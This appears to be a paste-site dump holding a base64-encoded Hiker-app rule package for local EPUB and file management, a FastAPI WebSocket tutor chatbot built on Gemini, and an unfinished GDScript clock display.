ICAgICAgICBzZWNVbml0OiB0cnVlXFxcXG4gICAgfSxcXFxcbiAgICDkur86IHtcXFxcbiAgICAgICAgdmFsdWU6IDEwMDAwMDAwMCxcXFxcbiAgICAgICAgc2VjVW5pdDogdHJ1ZVxcXFxuICAgIH1cXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gQ2hpbmVzZVRvTnVtYmVyKGNoblN0cikge1xcXFxuICAgIGxldCBydG4gPSAwO1xcXFxuICAgIGxldCBzZWN0aW9uID0gMDtcXFxcbiAgICBsZXQgbnVtYmVyID0gMDtcXFxcbiAgICBsZXQgc2VjVW5pdCA9IGZhbHNlO1xcXFxuICAgIGxldCBzdHIgPSBjaG5TdHIuc3BsaXQoJycpO1xcXFxuXFxcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzdHIubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgbGV0IG51bSA9IGNobk51bUNoYXJbc3RyW2ldXTtcXFxcbiAgICAgICAgaWYgKHR5cGVvZiBudW0gIT09ICd1bmRlZmluZWQnKSB7XFxcXG4gICAgICAgICAgICBudW1iZXIgPSBudW07XFxcXG4gICAgICAgICAgICBpZiAoaSA9PT0gc3RyLmxlbmd0aCAtIDEpIHtcXFxcbiAgICAgICAgICAgICAgICBzZWN0aW9uICs9IG51bWJlcjtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIGxldCB1bml0ID0gY2huTmFtZVZhbHVlW3N0cltpXV0udmFsdWU7XFxcXG4gICAgICAgICAgICBzZWNVbml0ID0gY2huTmFtZVZhbHVlW3N0cltpXV0uc2VjVW5pdDtcXFxcbiAgICAgICAgICAgIGlmIChzZWNVbml0KSB7XFxcXG4gICAgICAgICAgICAgICAgc2VjdGlvbiA9IChzZWN0aW9uICsgbnVtYmVyKSAqIHVuaXQ7XFxcXG4gICAgICAgICAgICAgICAgcnRuICs9IHNlY3Rpb247XFxcXG4gICAgICAgICAgICAgICAgc2VjdGlvbiA9IDA7XFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIHNlY3Rpb24gKz0gKG51bWJlciAqIHVuaXQpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgbnVtYmVyID0gMDtcXFxcbiAgICAgICAgfVxcXFxuICAgIH1cXFxcbiAgICByZXR1cm4gcnRuICsgc2VjdGlvbjtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gbmFtZUNvbXBhcmUoYSwgYikge1xcXFxuICAgIGlmIChhID09IG51bGwgfHwgYiA9PSBudWxsKVxcXFxuICAgICAgICByZXR1cm4gYSA9PSBudWxsID8gYiA9PSBudWxsID8gMCA6IC0xIDogMTtcXFxcblxcXFxuICAgIGEgPSBhLnJlcGxhY2UoLyhb6Zu25LiA5LqM5LiJ5Zub5LqU5YWt5LiD5YWr5Lmd5Y2B55m+5Y2D5LiH5Lq/XSkvZywgZnVuY3Rpb24obWF0Y2gsIHAxLCBwMiwgcDMsIG9mZnNldCwgc3RyaW5nKSB7XFxcXG4gICAgICAgIC8vIHAxIGlzIG5vbmRpZ2l0cywgcDIgZGlnaXRzLCBhbmQgcDMgbm9uLWFscGhhbnVtZXJpY3NcXFxcbiAgICAgICAgcmV0dXJuIENoaW5lc2VUb051bWJlcihwMSk7XFxcXG4gICAgfSlcXFxcbiAgICBiID0gYi5yZXBsYWNlKC8oW+mbtuS4gOS6jOS4ieWbm+S6lOWFreS4g+WFq+S5neWNgeeZvuWNg+S4h+S6v10pL2csIGZ1bmN0aW9uKG1hdGNoLCBwMSwgcDIsIHAzLCBvZmZzZXQsIHN0cmluZykge1xcXFxuICAgICAgICAvLyBwMSBpcyBub25kaWdpdHMsIHAyIGRpZ2l0cywgYW5kIHAzIG5vbi1hbHBoYW51bWVyaWNzXFxcXG4gICAgICAgIHJldHVybiBDaGluZXNlVG9OdW1iZXIocDEpO1xcXFxuICAgIH0pXFxcXG5cXFxcbiAgICBsZXQgTlVNQkVSUyA9IGphdmEudXRpbC5yZWdleC5QYXR0ZXJuLmNvbXBpbGUoXFxcXFxcXCIoPzw9XFxcXFxcXFxcXFxcXFxcXEQpKD89XFxcXFxcXFxcXFxcXFxcXGQpfCg/PD1cXFxcXFxcXFxcXFxcXFxcZCkoPz1cXFxcXFxcXFxcXFxcXFxcRClcXFxcXFxcIik7XFxcXG4gICAgbGV0IHNwbGl0MSA9IE5VTUJFUlMuc3BsaXQobmV3IGphdmEubGFuZy5TdHJpbmcoYSkpO1xcXFxuICAgIGxldCBzcGxpdDIgPSBOVU1CRVJTLnNwbGl0KG5ldyBqYXZhLmxhbmcuU3RyaW5nKGIpKTtcXFxcblxcXFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgTWF0aC5taW4oc3BsaXQxLmxlbmd0aCwgc3BsaXQyLmxlbmd0aCk7IGkrKykge1xcXFxuICAgICAgICBsZXQgYzEgPSBzcGxpdDFbaV0uY2hhckNvZGVBdCgwKTtcXFxcbiAgICAgICAgbGV0IGMyID0gc3BsaXQyW2ldLmNoYXJDb2RlQXQoMCk7XFxcXG4gICAgICAgIGxldCBjbXAgPSAwO1xcXFxuICAgICAgICBsZXQgemVyb0NoYXJDb2RlID0gJzAnLmNoYXJDb2RlQXQoMCk7XFxcXG4gICAgICAgIGxldCBuaW5lQ2hhckNvZGUgPSAnOScuY2hhckNvZGVBdCgwKTtcXFxcblxcXFxuICAgICAgICBpZiAoYzEgPj0gemVyb0NoYXJDb2RlICYmIGMxIDw9IG5pbmVDaGFyQ29kZSAmJiBjMiA+PSB6ZXJvQ2hhckNvZGUgJiYgYzIgPD0gbmluZUNoYXJDb2RlKSB7XFxcXG4gICAgICAgICAgICBjbXAgPSBuZXcgamF2YS5tYXRoLkJpZ0ludGVnZXIoc3BsaXQxW2ldKS5jb21wYXJlVG8obmV3IGphdmEubWF0aC5CaWdJbnRlZ2VyKHNwbGl0MltpXSkpO1xcXFxuICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgaWYgKGNtcCA9PT0gMCkge1xcXFxuICAgICAgICAgICAgbGV0IHJlZ2V4ID0gL1thLXpBLVowLTldL1xcXFxuICAgICAgICAgICAgbGV0IHMxID0gU3RyaW5nKHNwbGl0MVtpXSlcXFxcbiAgICAgICAgICAgIGxldCBzMiA9IFN0cmluZyhzcGxpdDJbaV0pXFxcXG4gICAgICAgICAgICBpZiAocmVnZXgudGVzdChzMSkgfHwgcmVnZXgudGVzdChzMikpIHtcXFxcbiAgICAgICAgICAgICAgICBjbXAgPSBuZXcgamF2YS5sYW5nLlN0cmluZyhzcGxpdDFbaV0pLmNvbXBhcmVUbyhuZXcgamF2YS5sYW5nLlN0cmluZyhzcGxpdDJbaV0pKTtcXFxcbiAgICAgICAgICAgICAgICAvLyBjbXAgPSBzMS5sb2NhbGVDb21wYXJlKHMyLCAnZW4nKVxcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICBjbXAgPSBzMS5sb2NhbGVDb21wYXJlKHMyLCAnemgnKVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgaWYgKGNtcCAhPT0gMCkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIGNtcDtcXFxcbiAgICAgICAgfVxcXFxuICAgIH1cXFxcbiAgICBsZXQgbGVuZ3RoQ21wID0gc3BsaXQxLmxlbmd0aCAtIHNwbGl0Mi5sZW5ndGg7XFxcXG4gICAgLy8gaWYgKGxlbmd0aENtcCAhPT0gMCkgbGVuZ3RoQ21wID0gbGVuZ3RoQ21wID4gMCA/IC0xIDogMTtcXFxcbiAgICByZXR1cm4gbGVuZ3RoQ21wO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiByYW5rKGxpc3QsIG0pIHtcXFxcbiAgICBzd2l0Y2ggKG0pIHtcXFxcbiAgICAgICAgY2FzZSBcXFxcXFxcInR5cGVcXFxcXFxcIjpcXFxcbiAgICAgICAgICAgIHJldHVybiBsaXN0O1xcXFxuICAgICAgICBjYXNlIFxcXFxcXFwibmFtZVxcXFxcXFwiOlxcXFxuICAgICAgICAgICAgcmV0dXJuIGxpc3Quc29ydCgoYSwgYikgPT4gbmFtZUNvbXBhcmUoU3RyaW5nKGEuZ2V0TmFtZSgpKSwgU3RyaW5nKGIuZ2V0TmFtZSgpKSkpO1xcXFxuICAgICAgICBjYXNlIFxcXFxcXFwic2l6ZVxcXFxcXFwiOlxcXFxuICAgICAgICAgICAgcmV0dXJuIGxpc3Quc29ydCgoYSwgYikgPT4gRmlsZS5nZXRUb3RhbFNpemVPZkZpbGVzSW5EaXIoYSkgLSBGaWxlLmdldFRvdGFsU2l6ZU9mRmlsZXNJbkRpcihiKSk7XFxcXG4gICAgICAgIGNhc2UgXFxcXFxcXCJ0aW1lXFxcXFxcXCI6XFxcXG4gICAgICAgICAgICByZXR1cm4gbGlzdC5zb3J0KChhLCBiKSA9PiBhLmxhc3RNb2RpZmllZCgpIC0gYi5sYXN0TW9kaWZpZWQoKSk7XFxcXG4gICAgICAgIGRlZmF1bHQ6XFxcXG4gICAgICAgICAgICByZXR1cm4gbGlzdDtcXFxcbiAgICB9XFxcXG5cXFxcbn1cXFxcbiQuZXhwb3J0cz1yYW5rO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIiN2LmVwdWLop6PmnpDlmahcXFwiLFxcXCJwYXRoXFxcIjpcXFwiZXB1YlBhcnNlci52aWV3XFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxudmFyIGxheW91dCA9IFtdO1xcXFxuc2V0UGFnZVRpdGxlKFxcXFxcXFwi5Lmm57GN5L+h5oGvXFxcXFxcXCIpO1xcXFxubGV0IHBhdGggPSBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcXFxcXCJwYXRoXFxcXFxcXCIpIHx8IFxcXFxcXFwiXFxcXFxcXCIpIHx8IE1ZX1BBUkFNUy5wYXRoO1xcXFxubGV0IG1ldGEgPSBnZXRFcHViTWV0YWRhdGEocGF0aCk7XFxcXG4vL2xvZyhtZXRhKVxcXFxuXFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgdGl0bGU6IG1ldGEuZmlyc3RUaXRsZSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCIsXFxcXG4gICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXFxcbiAgICB9XFxcXG59KTtcXFxcblxcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIvCfkaTkvZzogIXvvJpcXFxcXFxcIiArIG1ldGEuYXV0aG9yc1swXS5sYXN0bmFtZSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJyaWNoX3RleHRcXFxcXFxcIixcXFxcbn0pO1xcXFxubGV0IGRlc2NyaXB0aW9uID0gKG1ldGEuZGVzY3JpcHRpb25zWzBdIHx8IFxcXFxcXFwiXFxcXFxcXCIpLnJlcGxhY2UoLzxwLio/Pnw8XFxcXFxcXFwvcD4vZywgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG5sZXQgdGRlc2NyaXB0aW9uID0gZGVzY3JpcHRpb247XFxcXG5pZiAoZGVzY3JpcHRpb24pIHtcXFxcbiAgICBcXFxcbiAgICBpZiAoZGVzY3JpcHRpb24ubGVuZ3RoID4gNTApIHtcXFxcbiAgICAgICAgZGVzY3JpcHRpb24gPSBkZXNjcmlwdGlvbi5zdWJzdHJpbmcoMCwgNTApICtcXFxcXFxcIi4uLi4uLlxcXFxcXFwiICtcXFxcXFxcIuabtOWkmj5cXFxcXFxcIi5saW5rKCQoKS5iNjQoXFxcXFxcXCInXFxcXFxcXCIpLnJ1bGUoKCkgPT4ge1xcXFxuICAgICAgICAgICAgc2V0UGFnZVRpdGxlKFxcXFxcXFwi566A5LuLXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgc2V0UmVzdWx0KFt7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi566A5LuL77yaPGJyPuOAgOOAgFxcXFxcXFwiICsgTVlfUEFSQU1TLnRleHQsXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwicmljaF90ZXh0XFxcXFxcXCIsXFxcXG5cXFxcbiAgICAgICAgICAgIH1dKTtcXFxcbiAgICAgICAgfSkpO1xcXFxuICAgIH1cXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIvCfk53nroDku4vvvJo8YnI+44CA44CAXFxcXFxcXCIrZGVzY3JpcHRpb24sXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInJpY2hfdGV4dFxcXFxcXFwiLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgdGV4dDogdGRlc2NyaXB0aW9uXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcbn1cXFxcbi8vc2V0UGFnZVRpdGxlKG1ldGEuZmlyc3RUaXRsZSk7XFxcXG5sYXlvdXQucHVzaCh7XFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwibGluZV9ibGFua1xcXFxcXFwiLFxcXFxuICAgIHVybDogXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbn0pO1xcXFxubGV0IGNoYXB0ZXJzID0gZ2V0RXB1YkNoYXB0ZXJzKHBhdGgpO1xcXFxuZm9yIChsZXQgaXQgb2YgY2hhcHRlcnMpIHtcXFxcbiAgICBsYXlvdXQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBpdC50aXRsZSxcXFxcbiAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9lcHViVmlld2VyLnZpZXcjcmVhZFRoZW1lIyNhdXRvUGFnZSNcXFxcXFxcIixcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCIsXFxcXG4gICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICBocmVmOiBpdC51cmwsXFxcXG4gICAgICAgICAgICBwYXRoOiBwYXRoLFxcXFxuICAgICAgICAgICAgdGl0bGU6IGl0LnRpdGxlXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcbn1cXFxcbnNldFJlc3VsdChsYXlvdXQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIiN2LmVwdWLmn6XnnIvlmahcXFwiLFxcXCJwYXRoXFxcIjpcXFwiZXB1YlZpZXdlci52aWV3XFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxubGV0IHBhdGggPSBNWV9QQVJBTVMucGF0aDtcXFxcbmxldCB1cmwgPSBNWV9QQVJBTVMuaHJlZjtcXFxcbmxldCBjID0gZ2V0RXB1YkNvbnRlbnQocGF0aCwgdXJsKTtcXFxcbi8vbGV0IGE9IGMucmVwbGFjZSgvXFxcXFxcXFxzPzxkaXYuKj8+fDxcXFxcXFxcXC9kaXY+XFxcXFxcXFxzPy9nLCBcXFxcXFxcIlxcXFxcXFwiKS5yZXBsYWNlKC9cXFxcXFxcXHM/PHAuKj8+KC4qKTxcXFxcXFxcXC9wPlxcXFxcXFxccz8vZywgXFxcXFxcXCJcXFxcXFxcXHUzMDAwXFxcXFxcXFx1MzAwMCQxPGJyPlxcXFxcXFwiKTtcXFxcbi8vbGV0IGI9Yy5yZXBsYWNlKC9cXFxcXFxcXHM/PGRpdi4qPz58PFxcXFxcXFxcL2Rpdj5cXFxcXFxcXHM/L2csIFxcXFxcXFwiXFxcXFxcXCIpLnJlcGxhY2UoL1xcXFxcXFxccz88cC4qPz4oLio/KTxcXFxcXFxcXC9wPlxcXFxcXFxccz8vZywgXFxcXFxcXCJcXFxcXFxcXHUzMDAwXFxcXFxcXFx1MzAwMCQxPGJyPlxcXFxcXFwiKTtcXFxcbi8vbG9nKGE9PWIpXFxcXG4vL2xvZyhnZXRFcHViQ29udGVudDAocGF0aCwgdXJsKSlcXFxcblxcXFxubGV0IGxheW91dCA9IFtdO1xcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInJpY2hfdGV4dFxcXFxcXFwiLFxcXFxuICAgIHRpdGxlOiAoXFxcXFxcXCI8c3Ryb25nPlxcXFxcXFwiICsgTVlfUEFSQU1TLnRpdGxlICsgXFxcXFxcXCI8L3N0cm9uZz5cXFxcXFxcIikuYmlnKCksXFxcXG59KTtcXFxcblxcXFxubGF5b3V0LnB1c2goe1xcXFxuICAgIHRpdGxlOiBjLFxcXFxuICAgIGNvbF90eXBlOiAncmljaF90ZXh0JyxcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICB0ZXh0U2l6ZTogMTgsXFxcXG4gICAgICAgIGNsaWNrOiB0cnVlXFxcXG4gICAgfVxcXFxufSk7XFxcXG5zZXRSZXN1bHQobGF5b3V0KTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCIjduaWh+S7tueuoeeQhlxcXCIsXFxcInBhdGhcXFwiOlxcXCJGaWxlTWFuYWdlbWVudC52aWV3XFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0NvbmZpZy5qc1xcXFxcXFwiKTtcXFxcbmxldCB1cmwgPSBcXFxcXFxcImh0dHA6Ly9oaWtlci5ub2tpYS5wcmVzcy9oaWtlcnVsZS9ydWxlbGlzdC5qc29uP2lkPTUwOTlcXFxcXFxcIjtcXFxcbmxldCBmID0gJC5yZXF1aXJlKHVybCk7XFxcXG5sZXQgdHlwZSA9IGdldFBhcmFtKFxcXFxcXFwidHlwZVxcXFxcXFwiLCBcXFxcXFxcImhvbWVQYXRoXFxcXFxcXCIpO1xcXFxuYWRkTGlzdGVuZXIoXFxcXFxcXCJvbkNsb3NlXFxcXFxcXCIsICgpID0+IHtcXFxcbiAgICByZWZyZXNoUGFnZSgpO1xcXFxufSk7XFxcXG5sZXQgaGlrZXJQYXRoID0gXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIgKyBDb25maWcuaG9tZVBhdGg7XFxcXG5pZighZmlsZUV4aXN0KGhpa2VyUGF0aCkpe1xcXFxuICAgIHdyaXRlRmlsZShoaWtlclBhdGgrXFxcXFxcXCIv5Yib5bu655uu5b2VLnR4dFxcXFxcXFwiLFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgIGRlbGV0ZUZpbGUoaGlrZXJQYXRoK1xcXFxcXFwiL+WIm+W7uuebruW9lS50eHRcXFxcXFxcIik7XFxcXG59XFxcXG5mLmZpbGVTZWxlY3Rpb24oe1xcXFxuICAgIGNhbGxiYWNrOiAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgLy/moLnmja7mlofku7bmianlsZXlkI3vvIznlKjkuI3lkIzlsI/nqIvluo/miZPlvIBcXFxcbiAgICAgICAgaWYgKFxcXFxcXFwiLmpwZ1xcXFxcXFwiID09PSBUWVBFKSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gUEFUSDtcXFxcbiAgICAgICAgfSBlbHNlIGlmIChcXFxcXFxcIi50eHRcXFxcXFxcIiA9PT0gVFlQRSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3R4dFBhcnNlci52aWV3P2lzQ2FjaGU9dHJ1ZSZydWxlPVxcXFxcXFwiICsgTVlfUlVMRS50aXRsZSArIFxcXFxcXFwiJnBhdGg9XFxcXFxcXCIgKyBQQVRIO1xcXFxuICAgICAgICB9IGVsc2UgaWYgKFxcXFxcXFwiLmVwdWJcXFxcXFxcIiA9PT0gVFlQRSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2VwdWJQYXJzZXIudmlldyNhdXRvQ2FjaGUjP3J1bGU9XFxcXFxcXCIgKyBNWV9SVUxFLnRpdGxlICsgXFxcXFxcXCImcGF0aD1cXFxcXFxcIiArIFBBVEg7XFxcXG4gICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gJChcXFxcXFxcIuaXoOazleaJk+W8gO+8jOaYr+WQpuS9v+eUqOWFtuS7luW6lOeUqOaJk+W8gO+8n1xcXFxcXFwiKS5jb25maXJtKHBhdGggPT4gXFxcXFxcXCJvcGVuRmlsZTovL2ZpbGU6Ly9cXFxcXFxcIiArIHBhdGgsIFBBVEgpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSksXFxcXG4gICAgaW5pdGlhbFBhdGg6IENvbmZpZ1t0eXBlXSxcXFxcbiAgICByb290RGlyUGF0aDogQ29uZmlnLmhvbWVQYXRoLFxcXFxuICAgIC8vb25DbGlja1R5cGU6IFxcXFxcXFwiY29uZmlybVxcXFxcXFwiLFxcXFxuICAgIC8vbWVtb3J5OiBcXFxcXFxcIkZpbGVNYW5hZ2VtZW50Om1lbW9yeVxcXFxcXFwiLFxcXFxuICAgIGZpbGVUeXBlOiBcXFxcXFxcIlxcXFxcXFxcLnR4dHxcXFxcXFxcXC5lcHVifC5qcGdcXFxcXFxcIixcXFxcbiAgICAvL2NIb21lVGlwczogXFxcXFxcXCLmmK/lkKbkvb/nlKjmtbfpmJTlsI/nqIvluo/miZPlvIBbJHtuYW1lfV0/XFxcXFxcXCIsXFxcXG4gICAgLy9jU2VhcmNoVGlwczogXFxcXFxcXCLmmK/lkKbkvb/nlKjmtbfpmJTlsI/nqIvluo/miZPlvIBbJHtwYXRofV0/XFxcXFxcXCJcXFxcbn0pO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIiNqLkNvbmZpZ1xcXCIsXFxcInBhdGhcXFwiOlxcXCJDb25maWcuanNcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5jb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanM/cnVsZT3mnKzlnLDotYTmupDnrqHnkIZcXFxcXFxcIik7XFxcXG5cXFxcbmxldCBsb2NhbENvbmZpZyA9IHt9O1xcXFxuXFxcXG50cnkge1xcXFxuICAgIGxvY2FsQ29uZmlnID0gSlNPTi5wYXJzZShGaWxlLnJlYWRGaWxlKGdldFBhdGgoXFxcXFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL2ZpbGVzL+acrOWcsOi1hOa6kOeuoeeQhi9jb25maWcuanNvblxcXFxcXFwiKS5zbGljZSg3KSkpO1xcXFxufSBjYXRjaCAoZSkge1xcXFxuICAgIGRlbGV0ZUZpbGUoXFxcXFxcXCJjb25maWcuanNvblxcXFxcXFwiKTtcXFxcbn1cXFxcbmNvbnN0IENvbmZpZyA9IE9iamVjdC5hc3NpZ24oe1xcXFxuICAgIGhvbWVQYXRoOiBnZXRQYXRoKFxcXFxcXFwiaGlrZXI6Ly9maWxlcy9sb2NhbE1hbmFnZXJcXFxcXFxcIikuc2xpY2UoNyksXFxcXG4gICAgbG9nTnVtOiAxMCxcXFxcbiAgICB0aHJlYWROdW06IDAsXFxcXG4gICAgZGVmX2lzUGFnaW5hdGU6IFxcXFxcXFwiMVxcXFxcXFwiLCAvLzHpu5jorqTlvIDlkK/liIbpobXvvIww6buY6K6k5YWz6ZetXFxcXG4gICAgdmlld1BhZ2VTaXplOiAyMDAsXFxcXG4gICAgZGVmX1BpYzogXFxcXFxcXCJoaWtlcjovL2ltYWdlcy9ob21lX3BpYzRcXFxcXFxcIixcXFxcbiAgICBkZWZfTG9yZF9UeXBlOiBcXFxcXFxcImNvbWljXFxcXFxcXCIsXFxcXG4gICAgZGVmX1ZpZXdfU3R5bGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCIsXFxcXG4gICAgZGVmX0RvVmlfU3R5bGU6IFxcXFxcXFwidGV4dF8yXFxcXFxcXCIsXFxcXG4gICAgZGVmX0RvVmlfVHlwZTogXFxcXFxcXCIxXFxcXFxcXCIsIC8vMOWFqOmDqCwgMeacquWujOaIkO+8jDLlt7LlrozmiJBcXFxcbiAgICBkZWZfaXNDb21pY0NvbXBhdGlibGU6IFxcXFxcXFwiMFxcXFxcXFwiLFxcXFxuICAgIGRlZl9Db21pY19TdHlsZTogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIlxcXFxufSwgbG9jYWxDb25maWcpO1xcXFxuY29uc3QgUEFUSFMgPSB7XFxcXG4gICAgbm92ZWxQYXRoOiBcXFxcXFxcIi/lsI/or7QvXFxcXFxcXCIsXFxcXG4gICAgY29taWNQYXRoOiBcXFxcXFxcIi/mvKvnlLsvXFxcXFxcXCIsXFxcXG4gICAgbm92ZWxGdWxsUGF0aDogXFxcXFxcXCIv5bCP6K+05ZCI5bm2L1xcXFxcXFwiLFxcXFxuICAgIGV4dGVybmFsSW1wb3J0UGF0aDogXFxcXFxcXCIv5aSW5a+85bCP6K+0L1xcXFxcXFwiLFxcXFxuICAgIGNvbnRlbnRzQ2FjaGU6IFxcXFxcXFwiL+ebruW9lee8k+WtmC9cXFxcXFxcIlxcXFxufVxcXFxuXFxcXG5cXFxcbk9iamVjdC5rZXlzKFBBVEhTKS5mb3JFYWNoKGtleSA9PiBDb25maWdba2V5XSA9IENvbmZpZy5ob21lUGF0aCArIFBBVEhTW2tleV0pO1xcXFxuXFxcXG4kLmV4cG9ydHMgPSBDb25maWc7XFxcIn1dXCIsXCJwcm94eVwiOlwiXCJ9IiwidGl0bGUiOiLmnKzlnLDotYTmupDnrqHnkIZ86K6+572uIn0=
fq2CRJ4n,chatbot,FokaKefir,Python,Wednesday 14th of May 2025 12:04:49 PM CDT,"# gemini.py
import google.generativeai as genai
from dotenv import load_dotenv
import os

load_dotenv()

API_KEY = os.getenv(""GEMINI_API_KEY"")
if not API_KEY:
    raise ValueError(""GEMINI_API_KEY is missing! Please check your .env file."")

genai.configure(api_key=API_KEY)
model = genai.GenerativeModel('gemini-2.0-flash')

# main.py

from fastapi import FastAPI, Depends, HTTPException, Header, Query, WebSocket, WebSocketDisconnect
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from sqlalchemy.orm import Session
from sqlalchemy import func, exists
from datetime import datetime, timezone, timedelta
from app.database import SessionLocal
from app.models import *
from app.schemas import *
from app.gemini import *
import json
import asyncio
import re
import os

# FastAPI app
app = FastAPI()

# Store connected clients
active_connections = []

# Dictionary to store chat history per WebSocket session
chat_sessions = {}

@app.websocket(""/chat_ws"")
async def websocket_endpoint(websocket: WebSocket):
    """""" WebSocket to handle real-time AI study chat based on markdown content """"""
    await websocket.accept()
    active_connections.append(websocket)

    session_id = id(websocket)  # Unique identifier for session
    chat_sessions[session_id] = []  # Initialize chat history

    try:
        await websocket.send_text(""Hi! How can I *help* you?"")
        while True:
            data = await websocket.receive_text()
            try:
                request = json.loads(data)
                markdown_text = request.get(""markdown"", """").strip()
                user_prompt = request.get(""prompt"", """").strip()

                # Handle missing fields
                if not markdown_text or not user_prompt:
                    await websocket.send_text(""Error: Both 'markdown' and 'prompt' fields are required."")
                    continue

                # Maintain context (limit last 5 messages)
                chat_context = ""\n"".join(chat_sessions[session_id][-5:])

                # Construct the AI prompt
                ai_prompt = f""""""
                You are an AI tutor. The following is a lecture in Markdown format:
                
                {markdown_text}

                Previous chat history:
                {chat_context}
                
                Based on this content, User: {user_prompt}

                Your sole task is to assist with the provided markdown content. You may use your knowledge to elaborate on the topic, clarify concepts, or generate relevant examples, but you must not respond to unrelated questions or perform tasks outside this context.
                """"""

                # Run the AI model in a separate thread to avoid blocking the event loop
                response = await asyncio.to_thread(model.generate_content, ai_prompt)

                # Clean response by removing extra newlines
                cleaned_response = re.sub(r'\n+', '\n', response.text).strip()

                # Store conversation
                chat_sessions[session_id].append(f""User: {user_prompt}"")
                chat_sessions[session_id].append(f""AI: {cleaned_response}"")

                await websocket.send_text(cleaned_response)
            except json.JSONDecodeError:
                await websocket.send_text(""Error: Invalid JSON format."")
    except WebSocketDisconnect:
        active_connections.remove(websocket)
        chat_sessions.pop(session_id, None)  # Remove chat history on disconnect
        print(""Client disconnected"")
    except Exception as e:
        print(f""Error in WebSocket: {e}"")
        await websocket.close()



"
qB2syZ1S,Time_display,lil_sue,GDScript,Wednesday 14th of May 2025 12:03:11 PM CDT,"extends RichTextLabel

# Time Variables
var S: int = 0
var M: int = 0
var H: int = 0

@onready var secondhand: Timer = $""../../third_person/Time_display/secondhand""
@onready var hide_timer: Timer = $""../../third_person/Time_display/hide_timer""


func _ready() -> void:
	# Ensure timers are connected
	if not secondhand.timeout.is_connected(_on_secondhand_timeout):
		secondhand.timeout.connect(_on_secondhand_timeout)

	hide_timer.wait_time = 5.0  # Fade out after 5 seconds
	hide_timer.timeout.connect(_on_hide_timer_timeout)

	modulate.a = 0.0  # Start completely invisible
	secondhand.start()  # Start the timer

func _on_secondhand_timeout() -> void:
	S += 1
	if S >= 60:
		S = 0
		M += 1
	if M >= 60:
